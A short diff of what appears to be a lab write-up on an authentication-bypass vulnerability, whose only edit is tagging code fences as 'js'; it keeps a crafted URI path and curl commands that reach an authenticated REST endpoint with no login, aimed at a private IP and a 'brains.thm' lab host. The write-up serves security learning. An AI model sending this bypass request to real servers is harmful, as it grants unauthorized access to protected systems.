@@ -156,11 +156,11 @@ Combining the above requirements, the attacker’s URI path becomes:
 	/hax?jsp=/app/rest/server;.jsp
 By using the authentication bypass vulnerability, we can successfully call this authenticated endpoint with no authentication.
 >
-> ```
+> ```js
 > C:\Users\sfewer>curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.jsp
 > ```
 
-```
+```js
 curl -ik 'http://brains.thm:50000/hax?jsp=/app/rest/server;.jsp'
 ```
 
